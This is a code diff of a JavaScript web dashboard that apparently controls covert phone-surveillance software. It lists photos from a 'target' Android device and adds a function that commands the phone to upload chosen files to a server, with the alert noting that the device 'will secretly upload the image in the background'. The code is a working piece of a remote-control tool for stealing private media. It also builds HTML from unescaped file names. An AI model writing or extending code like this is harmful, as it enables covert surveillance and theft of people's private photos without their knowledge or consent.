@@ -1,19 +1,20 @@
 document.addEventListener('DOMContentLoaded', async () => {
     const container = document.getElementById('gallery-container');
+    
+    // 🚀 BUG FIX: Ensuring correct local storage keys are used
+    const token = localStorage.getItem('owner_token');
     const deviceId = localStorage.getItem('active_device_id');
 
-    if (!deviceId) {
-        container.innerHTML = '<p style="color: #d32f2f;">Critical Error: Target Device ID missing. Please select a device from the dashboard.</p>';
+    if (!token || !deviceId) {
+        container.innerHTML = '<p style="color: #d32f2f;">Critical Error: Session or Target Device ID missing. Please re-authenticate.</p>';
         return;
     }
 
     try {
-        // 1. Get Security Config
         const configRes = await fetch('/api/config');
         const config = await configRes.json();
         
-        // 2. Fetch LIVE DATA (Strict Limit: 10, Order: Newest First)
-        // Assume 'device_photos' is the table where Android pushes the metadata & URL
+        // Fetching text/metadata from 'device_photos' table
         const queryUrl = `${config.supabase_url}/rest/v1/device_photos?device_id=eq.${deviceId}&order=created_at.desc&limit=10`;
         
         const photoRes = await fetch(queryUrl, {
@@ -30,7 +31,6 @@ document.addEventListener('DOMContentLoaded', async () => {
             return;
         }
 
-        // 3. Render the Grid
         container.innerHTML = '<div class="gallery-grid" id="grid"></div>';
         const grid = document.getElementById('grid');
 
@@ -38,16 +38,34 @@ document.addEventListener('DOMContentLoaded', async () => {
             const card = document.createElement('div');
             card.className = 'photo-card';
             
-            // Convert timestamp to readable format
             const dateObj = new Date(photo.created_at);
             const formattedDate = dateObj.toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' });
+            
+            // Format size properly (Assuming Android sends size_bytes)
+            const sizeInMB = photo.size_bytes ? (photo.size_bytes / (1024 * 1024)).toFixed(2) : "Unknown";
+
+            // 🚀 SMART LOGIC: Agar URL already hai toh 'View Image' dikhao, warna 'Fetch from Phone'
+            const isUploaded = photo.file_url && photo.file_url.startsWith('http');
+            
+            let actionHtml = '';
+            if (isUploaded) {
+                actionHtml = `<a href="${photo.file_url}" target="_blank" class="view-btn">👁️ View Uploaded Image</a>`;
+            } else {
+                // We pass the exact file path to the phone so it knows what to upload
+                actionHtml = `<button class="action-btn" onclick="triggerMediaUpload('${photo.file_path}', '${photo.file_name}')">📥 Fetch Image From Phone</button>`;
+            }
 
             card.innerHTML = `
-                <a href="${photo.file_url}" target="_blank">
-                    <img src="${photo.file_url}" alt="Captured Media" class="photo-img" onerror="this.src='https://via.placeholder.com/250x250?text=Image+Not+Found'">
-                </a>
-                <div class="photo-meta">
-                    <span class="photo-date">Captured: ${formattedDate}</span>
+                <div>
+                    <div class="file-icon">🖼️</div>
+                    <div class="file-name">${photo.file_name || 'Unknown_Image.jpg'}</div>
+                    <div class="file-meta">
+                        Captured: ${formattedDate}<br>
+                        Size: ${sizeInMB} MB
+                    </div>
+                </div>
+                <div>
+                    ${actionHtml}
                 </div>
             `;
             grid.appendChild(card);
@@ -58,3 +76,38 @@ document.addEventListener('DOMContentLoaded', async () => {
         container.innerHTML = '<p style="color: #d32f2f;">Database connection failed. Check network logs.</p>';
     }
 });
+
+// ==========================================
+// 🚀 COMMAND INJECTION FOR ON-DEMAND UPLOAD
+// ==========================================
+window.triggerMediaUpload = async function(filePath, fileName) {
+    const isConfirmed = confirm(`Do you want to command the phone to upload "${fileName}" to the server?`);
+    if (!isConfirmed) return;
+
+    const token = localStorage.getItem('owner_token');
+    const deviceId = localStorage.getItem('active_device_id');
+
+    try {
+        const res = await fetch(`/api/devices/${deviceId}/action`, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+                'Authorization': `Bearer ${token}`
+            },
+            body: JSON.stringify({
+                action: `upload_specific_file:${filePath}` // Sending strict command to Android
+            })
+        });
+
+        const data = await res.json();
+        
+        if (data.status === 'success') {
+            alert(`Command Sent! The device will secretly upload the image in the background. Refresh this page in a minute to view it.`);
+        } else {
+            alert(`Execution Failed: ${data.message}`);
+        }
+    } catch (error) {
+        alert('Network Failure: Unable to establish secure link with the action server.');
+        console.error(error);
+    }
+}
